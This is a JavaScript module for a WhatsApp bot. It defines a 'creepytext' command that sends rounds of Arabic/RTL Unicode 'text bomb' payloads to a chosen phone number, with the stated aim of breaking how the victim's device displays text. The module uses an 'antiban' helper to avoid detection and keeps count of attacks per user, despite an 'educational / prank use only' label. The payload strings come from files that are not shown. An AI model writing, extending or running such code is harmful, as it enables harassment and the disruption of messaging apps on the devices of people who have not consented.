/**
 * 🐛 Tech God Bug 2026 — Creepy Text (Arabic/RTL Rendering Chaos)
 * Uses CREEPY_MD payloads with Arabic script + combining marks
 * that break text rendering.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

// Load Arabic/RTL payloads
const { creepyd9 } = require('./creepy-data/creepyd9');
const { creepyd11 } = require('./creepy-data/creepyd11');

const payloads = [creepyd9, creepyd11].filter(Boolean);

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.unicode) {
    return antiban.sendHuman(sock, jid, { text: '❌ Unicode bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy Text*\n\n*Usage:* ${config.prefix}creepytext @user [rounds]\n*Example:* ${config.prefix}creepytext @someone 3\n\n_Sends Arabic/RTL rendering chaos that breaks text display._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 3, 6);

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending CREEPY text bomb...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}\n⚡ Payload: RTL/Arabic Chaos`,
    mentions: [target]
  }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    const payload = payloads[i % payloads.length];
    const text = typeof payload === 'function' ? payload(config.prefix) : payload;
    await sock.sendMessage(target, { text });
    await new Promise(r => setTimeout(r, 500));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy text sent!*\n🐛 ${rounds} RTL bombs delivered to @${target.split('@')[0]}`,
    mentions: [target]
  }, { quoted: msg });
};
